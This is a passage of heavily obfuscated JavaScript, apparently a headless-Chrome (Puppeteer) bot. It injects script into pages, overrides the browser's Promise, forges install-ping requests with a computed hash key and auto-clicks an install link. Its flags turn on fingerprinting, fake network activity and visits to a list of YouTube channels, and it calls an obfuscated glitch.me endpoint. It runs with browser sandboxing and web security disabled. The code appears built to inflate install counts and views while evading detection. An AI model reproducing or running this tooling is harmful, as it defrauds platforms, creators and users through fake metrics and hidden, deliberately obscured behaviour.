                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x14ee + -0x9 * 0x21d + 0x29 * 0xfb ? (this['block'] = P[-0x2432 + -0x2b3 * 0xd + 0x4759], this['start'] = N - (-0x14f9 + -0x1b76 + 0x30af), this['hash'](), this['hashed'] = -0x1b45 + -0x1f1 * -0x1 + 0x1955) : this['start'] = N;
                }
                return this['bytes'] > -0x92487eb * -0x1d + -0x2ab * -0x61b82d + -0x10dd9c5af && (this['hBytes'] += this['bytes'] / (0x602 * 0x2e6e64 + -0x25ba4 * -0x1949 + -0x2 * 0x29492d46) << -0xb * 0x2ef + -0x1b41 + 0x3b86, this['bytes'] = this['bytes'] % (-0x2304c73c + 0x3d348b0c * 0x4 + 0x165ca * 0x210e)), this;
              }
            }
            ['finalize']() {
              const Y = c;
              if (!this['finalized']) {
                this['finalized'] = 0xcbf + 0x26ac + 0x336a * -0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xcdd * -0x1 + -0x1030 + 0x363] = this['block'], J[K >> 0x132f + 0x83 * -0x1 + -0x12aa] |= x[-0x19 * 0x87 + 0x1327 + 0x5 * -0x131 & K], this['block'] = J[0x1854 + -0xcb6 * 0x2 + 0x25 * 0x8], K >= -0x139 * -0x1b + -0xa9 * -0x1 + -0x2174 && (this[Y(0x5)] || this['hash'](), J[-0x746 * -0x2 + -0xeec + 0x60] = this['block'], J[0xa44 + 0x9d2 + -0x1406] = J[-0xb87 + -0x210c + 0x2c94] = J[-0x262b + -0xeb * -0x7 + -0x1fc * -0x10] = J[0x201a + 0x1a * -0xf7 + 0xb * -0xa3] = J[-0x76e + 0xf48 + -0x7d6] = J[0x1 * -0x182d + 0x3 * -0x219 + 0x1e7d] = J[-0x7 * 0x4eb + -0x56f * 0x1 + 0x7fa * 0x5] = J[-0xb * 0x242 + 0x23f2 * 0x1 + -0xb15] = J[0x53 * -0x43 + 0x179c + -0x5 * 0x5f] = J[0x70b + -0x2651 + 0x5 * 0x643] = J[-0x15 * -0x6 + 0x47f * -0x1 + -0x45 * -0xf] = J[-0x4 * -0x65b + 0x943 * -0x3 + 0x268] = J[-0x143 + -0x1d * 0x6b + 0xd6e] = J[-0x2e * 0xbd + -0x1 * 0x32b + 0x252e] = J[-0xb * -0x15d + 0x13bb + -0x22ac] = J[0xca * 0x2b + -0x2052 + -0x18d * 0x1] = -0x1682 + -0x1776 * 0x1 + 0x2df8), J[-0x781 + -0x18ae + 0x3f * 0x83] = this['hBytes'] << 0xce4 + -0x17b1 + -0x568 * -0x2 | this['bytes'] >>> 0x9 * 0x1df + -0x2da + -0x4 * 0x378, J[-0x1e6b + -0x571 + 0xbf9 * 0x3] = this['bytes'] << 0x1edb + -0x7d5 * 0x3 + -0x759, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x455 * 0x6 + -0xa0 * -0x29 + -0x6e * -0x1; J < -0x1255 + 0x20d7 + -0x4f * 0x2e; ++J)
                K = Q[J - (0x1 * -0xcdc + 0x1c2 * 0xf + 0xd7f * -0x1)] ^ Q[J - (-0x26f1 + 0xc12 + 0x1 * 0x1ae7)] ^ Q[J - (0x1f1 + 0x282 * 0x3 + -0x969)] ^ Q[J - (-0x135 * 0x1b + 0x2214 + -0x16d)], Q[J] = K << -0x1 * -0x26cf + -0x244 + -0x6 * 0x617 | K >>> -0x127d * 0x2 + 0x101 * 0x23 + 0x1 * 0x1f6;
              for (J = 0x59 * 0x1d + -0x4b * -0x29 + 0x65 * -0x38; J < -0x1f9 * 0xd + -0x765 + -0x1 * -0x211e; J += -0x3 * -0xa1a + 0x1 * 0x2d5 + -0x1b * 0x13a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x23f9 + -0x1bf9 + 0x3ff7 | L >>> 0x2 * -0x1065 + 0x807 + 0x18de) + (M & N | ~M & O) + P + (0x5860b3bc + 0x740aa322 + 0xd99 * -0x8608d) + Q[J] << -0x5 * 0x62a + -0x2439 + 0x430b) << -0x10 * 0x13 + 0x1a69 + -0x1934 | P >>> 0x1d9 * -0xb + 0x3ab + 0x10c3) + (L & (M = M << 0x1b8e + -0xd * 0x14c + -0xa94 | M >>> 0x5c5 + -0x1 * 0x613 + -0x4 * -0x14) | ~L & N) + O + (0x7b86d4ec + -0x39639b8f * -0x1 + -0x2 * 0x2d33fb71) + Q[J + (-0x140b + 0x1c6c * 0x1 + -0x860)] << -0x11ba + 0x26 * -0xb5 + 0x2c98) << 0x209 * 0xd + 0x537 + -0x1 * 0x1fa7 | O >>> -0xe37 + 0x63f * -0x1 + 0x41 * 0x51) + (P & (L = L << -0xf9 * -0x23 + -0x1 * 0x572 + -0x17 * 0x13d | L >>> 0xe * -0x1a5 + 0x6 * 0x639 + 0x727 * -0x2) | ~P & M) + N + (-0xab135ab7 + -0x2f50537f + 0x134e627cf) + Q[J + (0xdd4 + -0x11 * 0xc7 + 0x1 * -0x9b)] << -0x2577 + 0x401 + 0x2176 * 0x1) << -0x871 + 0x2190 + -0x191a | N >>> -0x88a + 0xb1 + 0x7f4) + (O & (P = P << -0x1 * -0x14e3 + 0x2fd * 0x6 + 0x26b3 * -0x1 | P >>> -0x29e * -0x3 + -0x18f1 + -0x5b3 * -0x3) | ~O & L) + M + (0x809231b7 + 0x972dfd11 + -0xbd3db52f) + Q[J + (0x1 * -0x215f + 0xab6 * 0x1 + 0x16ac)] << -0x970 + 0x20ca + 0x3d * -0x62) << 0x1db9 + -0x25db + 0x827 | M >>> 0x32 * -0x29 + -0xc49 + 0xa33 * 0x2) + (N & (O = O << -0x418 * 0x9 + 0x67a + 0x1e7c | O >>> -0x72b + -0x473 + 0x10 * 0xba) | ~N & P) + L + (-0x19b3b0a7 + 0x24cfc90f + 0x215b * 0x26163) + Q[J + (-0x3 * -0xf7 + -0x1 * 0x4f4 + 0xb1 * 0x3)] << 0x1a1 * -0x7 + -0x2c * -0x2c + 0x3d7, N = N << -0xa77 + 0x1f * 0x25 + 0x30d * 0x2 | N >>> -0x443 + 0x14ec + 0x7 * -0x261;
              for (; J < -0x13 * 0x209 + 0x25 * -0x1 + 0x26f8; J += -0x1c * -0x15c + 0x143d * -0x1 + -0x11ce)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x132e + -0x120 * 0x4 + -0xea9 | L >>> -0x4bb * 0x7 + 0x1 * -0x172d + 0x3865 * 0x1) + (M ^ N ^ O) + P + (0xdc5d77e5 + 0x5a073777 + -0x1c8189ad * 0x7) + Q[J] << -0xa98 * -0x1 + 0x19 * -0x25 + -0x6fb * 0x1) << 0x8 * 0x1cf + -0xd55 + -0x1 * 0x11e | P >>> -0x10fb + 0x11c8 + 0xb2 * -0x1) + (L ^ (M = M << 0x1 * -0x1471 + 0x26ab + -0x121c | M >>> 0x56f * 0x7 + -0x2445 + -0x1c2) ^ N) + O + (-0x438ad9c7 + -0x16f * 0x50c264 + 0x1262b72c4) + Q[J + (0x6a7 * 0x2 + 0xff0 + -0x1d3d)] << 0x67 * -0x57 + -0x2436 + 0x4737) << -0x3 * -0x3e5 + 0x153a + -0x20e4 | O >>> 0x8e9 + -0x136c + 0x1c5 * 0x6) + (P ^ (L = L << -0x1b44 + 0xe33 + 0xd2f | L >>> -0x267a + 0x1 * 0x982 + 0x1 * 0x1cfa) ^ M) + N + (-0x9e86973e + 0x9a8002c8 + 0x72e08017) + Q[J + (0x21b5 + 0x1eac + -0x405f)] << -0x5 * -0x3df + 0x2621 * 0x1 + -0x397c) << 0x524 + 0x556 + -0xa75 | N >>> 0x1e2e + 0xb5b + -0x14b7 * 0x2) + (O ^ (P = P << 0x1 * -0x212b + 0x114d * -0x1 + 0x3296 | P >>> -0x15e2 + -0x1 * -0x482 + 0x1162) ^ L) + M + (-0xd3eb9a71 + -0x9cffb * 0xc9c + 0x1be800706) + Q[J + (-0x5 * 0x5d1 + -0x1 * -0x1502 + 0x816)] << -0x15 * -0x19f + -0x17 * 0x39 + -0x1cec) << 0x356 * -0x4 + 0xa89 * -0x3 + 0x8 * 0x59f | M >>> 0x1 * 0x20eb + 0x55d * -0x6 + 0x2 * -0x51) + (N ^ (O = O << -0x196 + 0x7df + -0x62b | O >>> 0x4 * 0x521 + -0x1b97 + 0x25 * 0x31) ^ P) + L + (-0xd37e8c86 + -0x7 * -0x11dbbbe5 + 0xc55654e4) + Q[J + (-0x1936 + 0x932 + -0xe4 * -0x12)] << 0x1 * 0x1a02 + -0x10fc + -0x906, N = N << -0x13e2 + 0x8c * -0x2f + 0x2db4 | N >>> -0xc33 + 0x13d * -0x1d + 0x301e;
              for (; J < -0xb07 * -0x2 + 0x3 * 0xcf + -0x183f * 0x1; J += 0x19 * 0xbb + -0x9f9 + -0x845)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1e09 + 0xa4d + 0x1 * -0x2851 | L >>> -0x7 * 0x157 + -0x9f4 + 0x2 * 0x9b8) + (M & N | M & O | N & O) + P - (-0x4bbed537 + 0xbe513bee + -0x1ae2393) + Q[J] << 0x23b9 + 0x1fa4 + 0xd79 * -0x5) << 0x919 + 0x105d + 0x3 * -0x87b | P >>> -0x71 * -0x16 + 0x1af * -0x2 + 0x1 * -0x63d) + (L & (M = M << -0x1a95 * 0x1 + -0x2300 + -0x1 * -0x3db3 | M >>> 0x25 * 0x6f + 0x248d + 0x3496 * -0x1) | L & N | M & N) + O - (0x189444b * 0xd + -0x1 * 0x44402054 + -0x12ad3 * -0x8a13) + Q[J + (-0xa * -0x3d7 + -0xab9 + -0x1bac)] << -0x1c9 * -0x14 + -0x6ae * 0x1 + -0x1d06) << -0x1 * -0xef2 + -0x1242 + -0x355 * -0x1 | O >>> -0x2dd * 0x3 + 0x1 * 0x270e + -0x1e5c) + (P & (L = L << 0x59f * 0x6 + -0x8c0 + -0x18dc | L >>> 0xecf + -0x9ed + -0xd0 * 0x6) | P & M | L & M) + N - (0x26a3502 + -0x3720e0f2 + 0xb * 0xf0e15bc) + Q[J + (-0xca * -0x28 + 0x3b * -0x26 + 0xb66 * -0x2)] << 0x3ee * 0x8 + 0x25b7 + -0x4527) << -0x2e + -0x1129 * -0x1 + 0xd * -0x14e | N >>> 0x235 * 0x1 + -0x2 * 0x1132 + 0x2 * 0x1025) + (O & (P = P << -0xaf * -0x17 + -0x35e * 0x1 + -0xc3d | P >>> 0x1bd9 + -0xe5 * 0x3 + 0x8c * -0x2e) | O & L | P & L) + M - (-0x105d6f * -0xce8 + 0x2 * 0x454db1f1 + -0x61885 * 0x26de) + Q[J + (-0x1fa6 + 0x3d * 0xc + 0x1ccd)] << -0x2 * -0x59c + 0x4 * -0x3dd + 0x43c) << 0x1b * -0x73 + -0x1224 + -0x1 * -0x1e4a | M >>> -0x1b8a + 0x8 * -0x428 + 0x7 * 0x8b3) + (N & (O = O << -0x520 + -0xed1 + -0x403 * -0x5 | O >>> 0x52b * -0x3 + 0xc91 * -0x3 + -0x116 * -0x31) | N & P | O & P) + L - (0x1fd9da2 + 0x382e8276 + 0x29b0ddc * 0x15) + Q[J + (-0x74 + 0x17f * 0x7 + -0xc5 * 0xd)] << 0x239 * 0x6 + 0x2336 + -0x1846 * 0x2, N = N << -0x2 * -0x1367 + 0xcb7 + -0x3367 | N >>> 0x339 + 0x1 * -0xdfa + 0x13 * 0x91;
              for (; J < 0x229 * -0xa + -0x2588 + 0xe * 0x43f; J += -0x19ff + -0x39f + 0x1da3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1ce7 + -0x1684 + 0x337 * 0x10 | L >>> 0x199 * -0x15 + 0xa20 + 0x1788) + (M ^ N ^ O) + P - (-0x5bc43390 + -0x7 * -0x34efdf7 + 0x1 * 0x7a387ff9) + Q[J] << 0x99 * 0x3 + 0x1d7b * -0x1 + 0x1bb0) << -0x23ff + 0x8 * 0x376 + -0x1a * -0x52 | P >>> 0xd * -0x204 + -0x3 * 0x4ed + 0x2916) + (L ^ (M = M << 0x2 * 0x26f + 0x153c + -0x19fc | M >>> 0x1 * -0x9e1 + 0xb14 * 0x3 + -0x2b * 0x8b) ^ N) + O - (0x2e6c17 * -0x18d + 0x2ebe9df2 + -0x109bb * -0x4bf9) + Q[J + (-0x2 * -0x1e5 + -0x1498 + -0x14b * -0xd)] << 0x2 * -0x1c + -0x9 * -0x129 + -0xa39) << 0x1f24 + 0x267f + -0xe * 0x4f9 | O >>> -0x15c5 * 0x1 + 0x2 * -0x7f1 + 0x25c2) + (P ^ (L = L << 0x2 * 0x664 + 0x2 * 0xae5 + -0x2274 | L >>> 0x35 * 0x2e + 0x268a * -0x1 + 0x5 * 0x5ce) ^ M) + N - (0x6389bcc + -0x60926c58 + -0x47fb875b * -0x2) + Q[J + (0x20f6 + -0x20e7 + -0x1 * 0xd)] << -0x2198 + 0x6 * 0x133 + 0x1a66) << 0xec0 + 0x2137 + -0x2 * 0x17f9 | N >>> 0x57 * 0x39 + 0x1 * 0x25c + 0x568 * -0x4) + (O ^ (P = P << -0x1 * -0x734 + -0x1 * 0x1093 + -0x7 * -0x15b | P >>> 0x1ef2 + 0x1d4d + 0x1 * -0x3c3d) ^ L) + M - (-0x2311 * 0xab5a + -0x1618d260 + -0x1 * -0x632ebf84) + Q[J + (-0xbb8 * -0x2 + 0x4b8 + -0x1c25)] << -0xb6e * -0x3 + 0x3 * 0x545 + -0x3219) << -0x52e * -0x1 + 0x2d9 * -0x4 + 0x63b | M >>> 0xab * -0x1 + 0x10d * 0x1c + 0x1ca6 * -0x1) + (N ^ (O = O << 0x1bcd + 0x1 * -0x527 + -0x2d1 * 0x8 | O >>> -0x5d * 0x23 + -0x1ee * 0xb + 0x1 * 0x21f3) ^ P) + L - (-0xaba52 * 0x2c5 + -0x6215273 * -0x1 + 0x4d31f0d1) + Q[J + (-0x222e + -0x7b * 0x11 + -0x9 * -0x4b5)] << -0x20c2 + -0x1d24 + -0x13 * -0x342, N = N << -0x26b8 + -0x563 + -0x2c39 * -0x1 | N >>> -0xf2e * 0x2 + -0x6a4 * 0x5 + -0x67 * -0x9e;
              this['h0'] = this['h0'] + L << 0x7 * -0x31 + -0x1de5 + 0x1f3c, this['h1'] = this['h1'] + M << 0x1 * 0x12f + -0xfb * 0x19 + 0x2 * 0xbaa, this['h2'] = this['h2'] + N << 0x840 + -0x33 * 0x7e + -0x6 * -0x2cf, this['h3'] = this['h3'] + O << 0x26b2 + -0x368 + -0x234a * 0x1, this['h4'] = this['h4'] + P << -0x59d * -0x1 + 0xe9a + -0x1437;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x40f * -0x9 + -0x1 * 0x202 + -0x2269 & -0x1 * 0xcdf + 0x1573 + -0x885] + w[J >> 0x2 * -0x50b + 0x8c7 + 0x1 * 0x167 & -0x542 * 0x6 + 0x1261 * -0x2 + 0x637 * 0xb] + w[J >> -0x842 + 0x18da * 0x1 + 0x97 * -0x1c & -0x1188 + -0x200 * -0x2 + 0xd97] + w[J >> -0xb07 + 0x3d * 0x92 + 0x1 * -0x17b3 & 0x1222 + 0x250c + -0x371f] + w[J >> -0x1 * -0x201d + -0x19ef + 0x9d * -0xa & 0xc3a + -0x153f + 0x914] + w[J >> -0x12d3 + -0x30 * 0x20 + 0x18db & -0x808 * -0x1 + 0x8 * -0x48 + -0x125 * 0x5] + w[J >> 0xc03 * 0x1 + 0x1a29 + -0x2628 & 0x2f9 * 0xb + -0x25 * 0xfd + 0x3ed] + w[0x9f + -0x16a3 + -0x1613 * -0x1 & J] + w[K >> 0x255d + -0xc62 + -0x18df & -0x236 + 0x79e + 0x25 * -0x25] + w[K >> -0x543 * 0x3 + -0x19 * 0xe3 + 0x14 * 0x1e7 & -0x1f0b * 0x1 + -0x1e2 * 0x13 + -0x10 * -0x42e] + w[K >> -0x1b7a + 0x1e61 + -0x2d3 & 0x11ab * 0x1 + 0x1 * 0xf83 + -0x211f] + w[K >> -0x2 * 0x2fe + 0xd86 + -0x77a & -0xde6 * 0x2 + -0xd * -0x259 + -0x2aa] + w[K >> -0x26 * -0xaa + 0x2681 + 0x3fb1 * -0x1 & -0xf6 + 0x1 * -0x16f9 + 0x17fe] + w[K >> -0x14 * -0x67 + -0x1d94 + -0x14 * -0x114 & 0x21af + -0x67 + -0x195 * 0x15] + w[K >> -0x20c5 * 0x1 + 0x9cc + 0x16fd & 0x9ce + -0x2e0 * -0x3 + -0x125f] + w[-0x1 * 0x2033 + 0x2 * 0x9b + -0x7c3 * -0x4 & K] + w[L >> -0x1 * 0x2477 + 0x21e2 * -0x1 + -0x11 * -0x425 & 0x662 + 0x2 * -0x1b3 + -0x7 * 0x6b] + w[L >> -0x182 * -0x7 + -0x13d7 + 0x1 * 0x961 & 0x2 * 0xb5a + 0x10e4 + -0x2789] + w[L >> -0x1 * 0x19c7 + 0xed5 + 0xb06 & 0x1 * 0x22c7 + 0x16b4 + -0x396c] + w[L >> -0xdf * 0x5 + -0xb7d * -0x1 + -0x712 & -0x1 * -0x1726 + -0x1 * 0x20c3 + 0x9ac] + w[L >> -0x54a + 0x5 * -0x3fb + 0x193d & -0x82 + 0x2f6 * -0x2 + 0x67d] + w[L >> 0x667 * -0x1 + 0x13bc + -0xd4d & 0x2314 + 0x7 * 0x251 + 0xc * -0x445] + w[L >> 0x80c + 0x23f5 + -0x2bfd & -0x3c * 0x97 + -0x4 * 0x8d0 + 0x46b3] + w[-0xb81 * -0x1 + -0x397 * -0xa + 0x6 * -0x7e4 & L] + w[M >> 0x65c + -0x1d2 * 0x1 + -0x1 * 0x46e & -0x1136 * -0x1 + 0x2507 * 0x1 + -0x362e] + w[M >> -0x6 * 0x41 + 0x1 * 0x1ba4 + 0x1a06 * -0x1 & -0x67a + 0x6e2 + -0x59] + w[M >> 0x27 * -0xd3 + -0x2540 + 0xde5 * 0x5 & 0x5c9 * -0x6 + 0xc5f * -0x3 + 0x47e2] + w[M >> -0x439 + 0x55c + -0x19 * 0xb & -0x79 * 0x5 + -0x69 * 0x33 + -0x1757 * -0x1] + w[M >> -0xcd * -0x1d + -0x245 * 0x7 + 0x6 * -0x137 & 0x465 + -0x79 * -0xb + -0x1 * 0x989] + w[M >> -0x9c0 * -0x2 + -0x23dd + 0x3 * 0x577 & -0x1c9e + -0x10f1 * 0x1 + -0x1 * -0x2d9e] + w[M >> 0x1 * -0x1a + -0x2698 + -0x135b * -0x2 & -0xe7a + -0x1624 + -0xe5 * -0x29] + w[-0x37 * -0x55 + -0xa12 * 0x3 + -0x601 * -0x2 & M] + w[N >> -0xe * -0x2ab + 0xa86 + 0x3fb * -0xc & -0x25b8 * 0x1 + -0x682 + 0x2c49 * 0x1] + w[N >> -0x27 * -0xc3 + -0x7e8 * 0x2 + 0x1 * -0xdcd & -0x6 * 0x63b + 0x6b * -0x37 + 0x3c6e] + w[N >> -0x2452 + 0xab5 * -0x1 + 0x2f1b & 0x1c2e + 0x1764 + -0x3383] + w[N >> 0x1069 + 0x845 + -0x189e & 0xa3f * -0x1 + 0x866 + 0x1e8] + w[N >> 0x2471 + -0x4d * 0x43 + 0x103e * -0x1 & -0x4c1 + 0x1 * -0x1431 + 0x1901] + w[N >> -0x1c91 + 0x2424 + 0x78b * -0x1 & 0x23 * -0x37 + 0x2c2 * -0x8 + -0x10f * -0x1c] + w[N >> -0x2 * 0x12c3 + 0xc58 + 0x1932 & -0x2 * 0x1310 + -0x1 * 0x1cf1 + 0x1 * 0x4320] + w[0x5 * -0x665 + 0xa * -0xc7 + -0x1 * -0x27ce & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x208 + -0x59 * 0x36 + -0x10d6 * -0x1 & -0x6bd + -0x1 * 0x1a35 + 0x21f1,
                J >> -0xb * -0xca + 0x3ae + -0x4 * 0x313 & 0x1 * 0xd3d + 0x2595 * 0x1 + -0x31d3,
                J >> -0x68a + -0x1 * 0x1b6e + 0x80 * 0x44 & 0x10c7 + 0x4ed * -0x1 + -0xadb * 0x1,
                0x4d * 0x1 + -0x161f + 0x16d1 & J,
                K >> -0x5 * -0xec + -0xa1b + 0x597 & -0x142f + 0x10b5 + -0x479 * -0x1,
                K >> -0x23d4 + 0x13dd + 0x1007 & -0x1651 + 0x7 * -0x44f + 0x3579,
                K >> 0x271 * 0x6 + 0x2492 * 0x1 + -0x3330 & -0x4 * -0x83 + 0xda2 + -0xeaf,
                0x3 * 0xc1b + -0xa38 + -0x191a & K,
                L >> 0x37d * 0x4 + -0x1653 + 0x877 & 0x13ea + -0x39 * 0xad + 0x2 * 0x9cd,
                L >> 0xe95 * 0x1 + 0x1e10 + -0x2c95 & -0x30 * 0x27 + -0x157a + 0x1dc9,
                L >> 0xd31 * -0x1 + 0xbf9 * 0x1 + -0x5 * -0x40 & 0x1 * -0xaba + -0x7e2 + -0x3 * -0x689,
                -0xad6 + -0x1de9 * -0x1 + -0x1214 & L,
                M >> -0x24 * -0x12 + 0x2558 + -0x27c8 & -0x1627 + -0x27 * 0x49 + 0x2245,
                M >> -0x12 * 0x13c + -0x3 * -0x45 + 0x1579 & -0x32b * -0x1 + 0x1045 * -0x1 + 0x4b3 * 0x3,
                M >> -0x1 * -0x1be6 + 0x7a * -0x1d + -0xe0c & -0x1e10 + 0x1eb4 + -0x5b * -0x1,
                0x2 * -0x108 + 0x3d7 * -0x7 + 0x1df0 & M,
                N >> 0x4c1 * 0x5 + 0x804 + -0x487 * 0x7 & 0x1b03 + 0xb23 + -0x2527,
                N >> 0xd55 + 0x25bf + -0x3304 & 0x25c4 + -0x1369 * 0x2 + -0x69 * -0x5,
                N >> -0x5 * -0x7b1 + 0xf7f + -0x35ec & -0x19d7 + -0x443 + 0x13 * 0x1a3,
                0x14 * -0xa0 + 0x1 * 0xff8 + -0x279 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * 0x69d + -0x124 + -0x565), (K = new DataView(J))['setUint32'](-0x377 * -0x3 + -0x1d2a + -0x9b * -0x1f, this['h0']), K['setUint32'](-0x157e + 0x5 * -0x619 + -0x11 * -0x30f, this['h1']), K['setUint32'](-0x34e + -0x1 * 0x1a4f + 0x1da5, this['h2']), K['setUint32'](0xd74 + 0x33 * 0x21 + -0x13fb, this['h3']), K['setUint32'](-0xdfb + 0xe1e + 0x1 * -0x13, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x102f + -0x19ed + 0x2a1c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2 * 0x10e + 0x4 * 0x11f + 0x8 * -0xd3;
            J[0xf2 + -0x10 * 0xc0 + 0xb0e]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2 * 0x121e + 0x1ea6 + -0x42e2] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1003 + -0x16 * 0x192 + 0x3290), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x21f1 + 0x9 * -0x3db + 0x44a5;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x120a * -0x2 + -0x2590 * -0x1 + 0x3c4 * -0x12), Promise['resolve'](0x1 * -0x1e9 + 0x4 * 0x776 + -0x1bee);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1 * 0x2474 + -0x24e0 + 0x6c; j < 0x1 * 0x16f + 0xadb + -0xc49; j++)
    i();
}
const NETWORK_PATIENCE = 0x2eed + 0x9 * -0x458 + 0x176b + (0xfcd * -0x2 + -0x1f * 0x91 + -0x3ce1 * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1aec * 0x1 + -0x168c + 0x317b) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1 * 0x10d9 + -0x250 * -0x8 + -0x1 * 0x2359);
    let h = e[f];
    if (c['TNDoim'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xa * 0xac + 0x2 * 0xe5c + 0x2c * -0x80, r, s, t = -0x211e + 0x3 * -0x545 + 0x30ed; s = m['charAt'](t++); ~s && (r = q % (-0x17a1 * -0x1 + 0x222f + 0x19b * -0x24) ? r * (-0xa * 0x16 + 0x18ba * -0x1 + -0x1 * -0x19d6) + s : s, q++ % (0x1dcb + 0x61 * 0x1 + -0x1e28 * 0x1)) ? o += String['fromCharCode'](-0x1 * -0x143e + 0xb9e * 0x3 + -0x3619 & r >> (-(0x63f * -0x5 + -0x2 * -0x74f + 0x109f) * q & 0x143 * -0x5 + 0x14a1 + -0xe4c)) : -0xe8b + 0x1 * -0xd13 + 0x2 * 0xdcf) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1830 + 0x19 * 0xdb + 0xef * 0x3, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x18fd + 0x416 + -0x1d03))['slice'](-(-0xb4f * 0x3 + 0x115c + 0x1093 * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['aUmyrq'] = i, b = arguments, c['TNDoim'] = !![];
    }
    const j = e[-0xd6 * -0x1f + -0x1 * -0xef8 + 0x2 * -0x1471],
      k = f + j,
      l = b[k];
    return !l ? (h = c['aUmyrq'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1 * 0x10d9 + -0x250 * -0x8 + -0x1 * 0x2359);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xb * -0x33d + 0x1 * -0x1249 + 0x35e8; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
